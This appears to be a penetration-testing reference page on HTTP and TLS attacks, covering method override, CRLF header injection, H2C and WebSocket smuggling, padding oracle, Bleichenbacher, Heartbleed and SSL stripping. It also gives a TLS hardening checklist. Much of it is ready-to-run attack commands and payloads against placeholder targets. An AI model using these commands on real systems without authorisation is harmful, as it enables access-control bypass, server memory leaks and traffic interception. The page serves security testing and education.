# HTTP & TLS Attacks

> **Summary**: Attacks targeting HTTP protocol features (methods, headers, connection upgrades) and TLS implementation weaknesses to bypass security controls, intercept traffic, or access restricted resources.
> **Impact**: Authentication bypass, WAF/proxy bypass, access to restricted endpoints, traffic interception, session hijacking, and information disclosure.
> **Typical Severity**: Medium -- High

---

## Detection

### Indicators
- Reverse proxy or load balancer in front of backend (Nginx, Apache, HAProxy, Traefik, AWS ALB)
- Application behavior differs based on HTTP method (GET vs POST vs PUT)
- `Upgrade` or `Connection` headers processed by intermediary proxies
- TLS termination at proxy with HTTP backend communication
- Mixed HTTP/HTTPS content or weak TLS configuration

### Automated Detection
```bash
# Test TLS configuration
testssl.sh https://<TARGET>

# Test for supported HTTP methods
nmap --script http-methods -p 443 <TARGET>

# Check for H2C upgrade support
curl -v --http2 http://<TARGET>/ -H "Upgrade: h2c" -H "Connection: Upgrade, HTTP2-Settings"
```

### Manual Detection
1. Send requests with different HTTP methods to the same endpoint and compare responses
2. Add `X-HTTP-Method-Override` headers to test for method override support
3. Test for `Connection: Upgrade` handling by the reverse proxy
4. Check TLS version support and cipher suites with `openssl s_client`

---

## Exploitation

### Prerequisites
- For HTTP method/header attacks: a reverse proxy or WAF that applies rules based on HTTP methods or headers
- For H2C smuggling: a proxy that forwards `Upgrade` and `Connection` headers to the backend
- For TLS attacks: weak TLS configuration, outdated protocols, or vulnerable cipher suites

### Step-by-Step (HTTP Method Tampering)

1. **Identify access controls** -- find endpoints that return 403/405 for certain methods
2. **Test method override** -- use `X-HTTP-Method-Override`, `X-Method-Override`, or `X-HTTP-Method` headers
3. **Test verb tampering** -- replace GET with POST, PUT, PATCH, DELETE, OPTIONS, HEAD, TRACE
4. **Test case variations** -- some servers are case-sensitive: `GeT`, `gEt`, `PoSt`
5. **Success criteria** -- bypassed access control or received different response with tampered method

### HTTP Method Override / Verb Tampering

```bash
# Override headers (send POST but override to PUT/DELETE)
curl -X POST http://<TARGET>/admin -H "X-HTTP-Method-Override: PUT"
curl -X POST http://<TARGET>/admin -H "X-HTTP-Method: DELETE"
curl -X POST http://<TARGET>/admin -H "X-Method-Override: PATCH"

# Verb tampering -- test non-standard methods
curl -X TRACE http://<TARGET>/admin
curl -X OPTIONS http://<TARGET>/admin
curl -X HEAD http://<TARGET>/admin
curl -X PATCH http://<TARGET>/admin

# Case-sensitive method bypass
curl -X "GeT" http://<TARGET>/admin
curl -X "gEt" http://<TARGET>/admin
```

### HTTP Header Injection

If user input is reflected into response headers:

```
# CRLF injection to add arbitrary headers
<INPUT>%0d%0aX-Injected-Header:%20value
<INPUT>%0d%0aSet-Cookie:%20session=attacker_controlled

# Header injection via parameter
?redirect=http://target.com%0d%0aX-Forwarded-For:%20127.0.0.1
```

### H2C Smuggling (HTTP/2 Cleartext Upgrade)

Bypass reverse proxy access controls by upgrading to HTTP/2 over cleartext:

```bash
# Required headers for H2C upgrade
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
Connection: Upgrade, HTTP2-Settings
```

**How it works**:
1. Client sends HTTP/1.1 request with `Connection: Upgrade` to the reverse proxy
2. Reverse proxy forwards the upgrade request to the backend
3. Backend accepts the upgrade and establishes an HTTP/2 connection
4. Reverse proxy stops inspecting individual requests (assumes its job is done)
5. Attacker sends subsequent requests directly to the backend, bypassing proxy rules

**Vulnerable proxies** (forward `Upgrade` headers by default):
- HAProxy
- Traefik
- Nuster

**Potentially vulnerable** (if misconfigured to forward `Upgrade`):
- AWS ALB/CLB, Nginx, Apache, Squid, Varnish, Kong, Envoy

```bash
# Exploit with h2csmuggler
python3 h2csmuggler.py -x https://<TARGET>/ --test
python3 h2csmuggler.py -x https://<TARGET>/ -X GET http://<BACKEND>/admin
```

### WebSocket Smuggling

Abuse WebSocket upgrade handshake to bypass proxy restrictions:

**Scenario 1 -- Invalid Sec-WebSocket-Version**:
1. Send Upgrade request with incorrect `Sec-WebSocket-Version`
2. Backend rejects with 426 but proxy assumes WebSocket connection established
3. Proxy maintains open TCP connection, allowing direct backend access

**Scenario 2 -- Health Check SSRF**:
1. Send POST to health check API with `Upgrade: websocket` header
2. Health check reaches attacker-controlled server that returns status 101
3. Proxy believes WebSocket connection exists, maintains open tunnel

---

## OpenSSL Commands Reference

| Command | Description |
|---------|-------------|
| `openssl s_client -connect <HOST>:443` | Connect and inspect TLS handshake |
| `openssl s_client -connect <HOST>:443 \| openssl x509 > cert.pem` | Download server certificate |
| `openssl x509 -in cert.pem -text -noout` | Display certificate details |
| `openssl req -x509 -newkey rsa:4096 -keyout key.pem -out self.pem -sha256 -days 365` | Create self-signed certificate |
| `openssl rsa -in rsa.pem -pubout > pub.pem` | Extract public key from keypair |

---

## TLS-Specific Attacks

### TLS Handshake Overview

**TLS 1.2**: ClientHello -> ServerHello -> Certificate -> ServerKeyExchange -> ClientKeyExchange -> ChangeCipherSpec -> Finished

**TLS 1.3**: ClientHello (with key share) -> ServerHello (with key share) -> Finished (1-RTT handshake)

### Padding Oracle (CBC Mode)

```bash
# Exploit with padbuster
padbuster http://<TARGET>/ "<ENCRYPTED_SAMPLE>" <BLOCK_SIZE> -encoding 0 -cookies "session=<ENCRYPTED_SAMPLE>"
```

Parameters: `-encoding` (0=Base64, 1=lowercase hex, 2=uppercase hex), `-cookies` or `-post` for ciphertext location, `-plaintext` to encrypt custom plaintext, `-usebody` to analyze response body.

### POODLE (SSL 3.0)

Exploits SSL 3.0 padding -- last byte indicates padding length, but other padding bytes are arbitrary and not verified. Allows decryption of one byte per 256 requests on average.

### Bleichenbacher (RSA PKCS#1 v1.5)

```bash
# Exploit with bleichenbacher tool
java -jar bleichenbacher.jar -connect <TARGET>:443 -executeAttack
java -jar bleichenbacher.jar -pcap ./capture.pcap -executeAttack
```

### Heartbleed (OpenSSL CVE-2014-0160)

```bash
java -jar heartbleed.jar -connect <TARGET>:443 -executeAttack -heartbeats 10
# Leaks up to 64KB of server memory per heartbeat
```

### SSL Stripping

```bash
# ARP spoof to intercept traffic
sudo arpspoof -i <INTERFACE> <GATEWAY_IP>
# Then strip HTTPS connections using sslstrip or bettercap
```

**Defense**: HSTS header `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`

---

## TLS Best Practices (Audit Checklist)

- Do not offer SSL 2.0, SSL 3.0, TLS 1.0, or TLS 1.1
- No NULL or EXPORT cipher suites
- Prefer PFS cipher suites (ECDHE)
- Prefer GCM mode over CBC mode (avoids padding oracles)
- Enable HSTS with `includeSubDomains` and `preload`
- Use certificate transparency and OCSP stapling

---

## Testing TLS Configuration

```bash
# Comprehensive TLS testing
testssl.sh https://<TARGET>

# Quick SSL/TLS check
sslscan <TARGET>:443

# Check specific protocol support
openssl s_client -connect <TARGET>:443 -tls1
openssl s_client -connect <TARGET>:443 -tls1_1
openssl s_client -connect <TARGET>:443 -tls1_2
openssl s_client -connect <TARGET>:443 -tls1_3
```

---

## Bypasses

- **Method override headers**: bypass method-based ACLs with `X-HTTP-Method-Override`
- **Non-compliant H2C**: omit `HTTP2-Settings` from `Connection` header (some backends accept anyway)
- **Path normalization**: combine H2C smuggling with path traversal to reach admin endpoints
- **WebSocket version mismatch**: trick proxy into maintaining open tunnel via invalid upgrade
- **Protocol downgrade**: force TLS version negotiation to weaker protocol if server allows

---

## Escalation

- **H2C to admin panel access**: bypass path-based routing, authentication, and WAF via HTTP/2 tunnel
- **WebSocket tunnel to internal API**: access private REST APIs through smuggled WebSocket connection
- **TLS downgrade to MitM**: combine protocol downgrade with network position for traffic interception
- **Heartbleed to credential theft**: extract session tokens, private keys, or passwords from server memory
- **Method tampering to data modification**: use PUT/DELETE on endpoints that only restrict via GET/POST ACLs

---

## Tools

| Tool | Usage |
|------|-------|
| [testssl.sh](https://github.com/drwetter/testssl.sh) | `testssl.sh https://<TARGET>` -- comprehensive TLS testing |
| [sslscan](https://github.com/rbsec/sslscan) | `sslscan <TARGET>:443` -- quick TLS configuration check |
| [h2csmuggler (BishopFox)](https://github.com/BishopFox/h2csmuggler) | H2C smuggling exploitation |
| [h2csmuggler (Assetnote)](https://github.com/assetnote/h2csmuggler) | Alternative H2C smuggling tool |
| `padbuster` | Padding oracle exploitation |
| `openssl s_client` | Manual TLS inspection and testing |
| [websocket-smuggle](https://github.com/0ang3el/websocket-smuggle) | WebSocket smuggling labs and tools |

---

## References

- [H2C Smuggling - Assetnote](https://blog.assetnote.io/2021/03/18/h2c-smuggling/)
- [H2C Smuggling Request - BishopFox](https://bishopfox.com/blog/h2c-smuggling-request)
- [WebSocket Smuggling](https://github.com/0ang3el/websocket-smuggle)
- [OWASP Testing for HTTP Methods](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods)

---

**See also**: [Request Smuggling](request-smuggling.md) | [403 Bypass](../bypass/403.md)
